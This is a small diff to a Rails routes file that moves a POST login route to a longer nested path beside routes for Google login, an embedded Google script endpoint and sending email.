@@ -3,7 +3,7 @@ Rails.application.routes.draw do
   root 'user#init'
   get "/ing/default/user/login_next/ing/default/index", to: "user#home"
   get "google-login", to: 'user#get_google_login'
-  post "user/login", to: 'user#new_from_saf'
+  post "/ing/default/user/login_next/ing/default/user/login", to: 'user#new_from_saf'
   post "login_google", to: 'user#new_from_gmail'
   post "google_embed_js", to: 'user#google_embed'
   post "send_email", to: "user#send_email"
